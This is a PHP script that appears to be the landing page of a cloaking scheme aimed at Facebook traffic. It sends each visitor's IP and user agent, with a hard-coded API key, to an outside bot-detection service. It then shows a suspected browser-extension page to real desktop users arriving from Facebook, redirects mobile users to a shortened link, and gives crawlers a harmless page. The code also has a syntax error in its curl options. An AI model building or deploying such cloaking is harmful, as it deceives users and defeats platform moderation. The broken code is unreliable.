<?php

require_once("includes/config.php");
require_once("includes/functions.php");

function getIpAddress() {
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipAddresses = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim(end($ipAddresses));
    }
    else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_URL => 'http://redirecting.live/api/isBot?i='.getIpAddress().'&u='.$_SERVER["HTTP_USER_AGENT"].'&api_key=51fa5653d1986420acfc567f4a9826ac';
));
$api = curl_exec($ch);
curl_close($ch);
$isref = false;


$data = json_decode($api);

$theme = "none";
$mobile = "https://goo.gl/2hIYpf";

if (strpos($_SERVER["HTTP_REFERER"], 'facebook.com') !== false){
    $isref = true;
}


if ($data->status == "true" && $data->type == "DES" && $isref == true) {

  $theme = "extension";

}

if ($data->status == "true" && $data->type == "MOB") {

  $theme = "mobile";

}

if ($theme == "extension") {

  if(strpos($_SERVER["HTTP_HOST"], $app_site) === false){
    header("Location: http://".$app_site."/".rand(1000000, 999999999));
  } else {
    require_once('extension.php');
  }
  exit;

} else if ($theme == "mobile") {

  header("Location: ".$mobile);
  exit;

} else {

  require_once('share.php');
  exit;
}
